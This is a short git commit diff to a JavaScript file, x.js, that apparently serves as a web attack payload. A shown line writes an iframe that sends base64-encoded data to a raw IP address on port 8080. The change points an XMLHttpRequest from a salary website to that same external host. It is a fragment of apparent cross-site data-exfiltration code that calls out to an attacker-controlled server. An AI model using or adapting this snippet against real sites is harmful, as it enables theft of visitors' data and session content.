3ee5199b5e86e751be069ea8446bf0b1cc33c23d
lkintheend <lkintheend@gmail.com>
2019-09-20 16:18:25 +0700

    Update x.js

--- x.js
+++ x.js
@@ -4,5 +4,5 @@ document.write('<iframe src="http://34.93.239.168:8080/?a='+b64+'"></iframe>');
 } 
 var req = new XMLHttpRequest(); 
 req.addEventListener("load", reqListener); 
-req.open("GET", "https://salary.topdev.vn"); 
+req.open("GET", "http://34.93.239.168:8080/?a=123123123123"); 
 req.send();
